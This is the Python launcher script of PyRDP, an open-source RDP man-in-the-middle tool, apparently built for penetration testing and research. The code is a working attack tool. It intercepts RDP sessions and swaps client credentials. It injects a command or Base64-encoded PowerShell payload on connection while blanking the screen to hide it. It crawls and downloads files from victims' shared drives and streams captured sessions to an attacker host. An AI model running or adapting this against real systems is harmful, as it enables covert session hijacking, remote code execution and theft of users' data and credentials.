#!/usr/bin/env python3

#
# This file is part of the PyRDP project.
# Copyright (C) 2018-2020 GoSecure Inc.
# Licensed under the GPLv3 or later.
#
import asyncio
import argparse
import logging
import os
import sys
from pathlib import Path
from base64 import b64encode

# need to install this reactor before importing other twisted code
from twisted.internet import asyncioreactor
asyncioreactor.install(asyncio.get_event_loop())

from twisted.internet import reactor

from pyrdp.core.mitm import MITMServerFactory
from pyrdp.mitm import MITMConfig
from pyrdp.mitm.cli import logConfiguration, parseTarget, prepareLoggers, validateKeyAndCertificate


def main():
    # Warning: keep in sync with twisted/plugins/pyrdp_plugin.py
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="IP:port of the target RDP machine (ex: 192.168.1.10:3390)")
    parser.add_argument("-l", "--listen", help="Port number to listen on (default: 3389)", default=3389)
    parser.add_argument("-o", "--output", help="Output folder", default="pyrdp_output")
    parser.add_argument("-i", "--destination-ip", help="Destination IP address of the PyRDP player.If not specified, RDP events are not sent over the network.")
    parser.add_argument("-d", "--destination-port", help="Listening port of the PyRDP player (default: 3000).", default=3000)
    parser.add_argument("-k", "--private-key", help="Path to private key (for SSL)")
    parser.add_argument("-c", "--certificate", help="Path to certificate (for SSL)")
    parser.add_argument("-u", "--username", help="Username that will replace the client's username", default=None)
    parser.add_argument("-p", "--password", help="Password that will replace the client's password", default=None)
    parser.add_argument("-L", "--log-level", help="Console logging level. Logs saved to file are always verbose.", default="INFO", choices=["INFO", "DEBUG", "WARNING", "ERROR", "CRITICAL"])
    parser.add_argument("-F", "--log-filter", help="Only show logs from this logger name (accepts '*' wildcards)", default="")
    parser.add_argument("-s", "--sensor-id", help="Sensor ID (to differentiate multiple instances of the MITM where logs are aggregated at one place)", default="PyRDP")
    parser.add_argument("--payload", help="Command to run automatically upon connection", default=None)
    parser.add_argument("--payload-powershell", help="PowerShell command to run automatically upon connection", default=None)
    parser.add_argument("--payload-powershell-file", help="PowerShell script to run automatically upon connection (as -EncodedCommand)", default=None)
    parser.add_argument("--payload-delay", help="Time to wait after a new connection before sending the payload, in milliseconds", default=None)
    parser.add_argument("--payload-duration", help="Amount of time for which input / output should be dropped, in milliseconds. This can be used to hide the payload screen.", default=None)
    parser.add_argument("--crawl", help="Enable automatic shared drive scraping", action="store_true")
    parser.add_argument("--crawler-match-file", help="File to be used by the crawler to chose what to download when scraping the client shared drives.", default=None)
    parser.add_argument("--crawler-ignore-file", help="File to be used by the crawler to chose what folders to avoid when scraping the client shared drives.", default=None)
    parser.add_argument("--no-replay", help="Disable replay recording", action="store_true")
    parser.add_argument("--gdi", help="Allow GDI passthrough (No video decoding)", action="store_true")

    args = parser.parse_args()
    outDir = Path(args.output)
    outDir.mkdir(exist_ok = True)

    logLevel = getattr(logging, args.log_level)
    pyrdpLogger = prepareLoggers(logLevel, args.log_filter, args.sensor_id, outDir)

    targetHost, targetPort = parseTarget(args.target)
    key, certificate = validateKeyAndCertificate(args.private_key, args.certificate)

    listenPort = int(args.listen)

    config = MITMConfig()
    config.targetHost = targetHost
    config.targetPort = targetPort
    config.privateKeyFileName = key
    config.certificateFileName = certificate
    config.attackerHost = args.destination_ip
    config.attackerPort = int(args.destination_port)
    config.replacementUsername = args.username
    config.replacementPassword = args.password
    config.outDir = outDir
    config.enableCrawler = args.crawl
    config.crawlerMatchFileName = args.crawler_match_file
    config.crawlerIgnoreFileName = args.crawler_ignore_file
    config.recordReplays = not args.no_replay
    config.allowGDI = args.gdi


    payload = None
    powershell = None

    if int(args.payload is not None) + int(args.payload_powershell is not None) + int(args.payload_powershell_file is not None) > 1:
        pyrdpLogger.error("Only one of --payload, --payload-powershell and --payload-powershell-file may be supplied.")
        sys.exit(1)

    if args.payload is not None:
        payload = args.payload
        pyrdpLogger.info("Using payload: %(payload)s", {"payload": args.payload})
    elif args.payload_powershell is not None:
        powershell = args.payload_powershell
        pyrdpLogger.info("Using powershell payload: %(payload)s", {"payload": args.payload_powershell})
    elif args.payload_powershell_file is not None:
        if not os.path.exists(args.payload_powershell_file):
            pyrdpLogger.error("Powershell file %(path)s does not exist.", {"path": args.payload_powershell_file})
            sys.exit(1)

        try:
            with open(args.payload_powershell_file, "r") as f:
                powershell = f.read()
        except IOError as e:
            pyrdpLogger.error("Error when trying to read powershell file: %(error)s", {"error": e})
            sys.exit(1)

        pyrdpLogger.info("Using payload from powershell file: %(path)s", {"path": args.payload_powershell_file})

    if powershell is not None:
        payload = "powershell -EncodedCommand " + b64encode(powershell.encode("utf-16le")).decode()

    if payload is not None:
        if args.payload_delay is None:
            pyrdpLogger.error("--payload-delay must be provided if a payload is provided.")
            sys.exit(1)

        if args.payload_duration is None:
            pyrdpLogger.error("--payload-duration must be provided if a payload is provided.")
            sys.exit(1)


        try:
            config.payloadDelay = int(args.payload_delay)
        except ValueError:
            pyrdpLogger.error("Invalid payload delay. Payload delay must be an integral number of milliseconds.")
            sys.exit(1)

        if config.payloadDelay < 0:
            pyrdpLogger.error("Payload delay must not be negative.")
            sys.exit(1)

        if config.payloadDelay < 1000:
            pyrdpLogger.warning("You have provided a payload delay of less than 1 second. We recommend you use a slightly longer delay to make sure it runs properly.")


        try:
            config.payloadDuration = int(args.payload_duration)
        except ValueError:
            pyrdpLogger.error("Invalid payload duration. Payload duration must be an integral number of milliseconds.")
            sys.exit(1)

        if config.payloadDuration < 0:
            pyrdpLogger.error("Payload duration must not be negative.")
            sys.exit(1)


        config.payload = payload
    elif args.payload_delay is not None:
        pyrdpLogger.error("--payload-delay was provided but no payload was set.")
        sys.exit(1)


    logConfiguration(config)

    reactor.listenTCP(listenPort, MITMServerFactory(config))
    pyrdpLogger.info("MITM Server listening on port %(port)d", {"port": listenPort})
    reactor.run()

    pyrdpLogger.info("MITM terminated")
    logConfiguration(config)

if __name__ == "__main__":
    main()
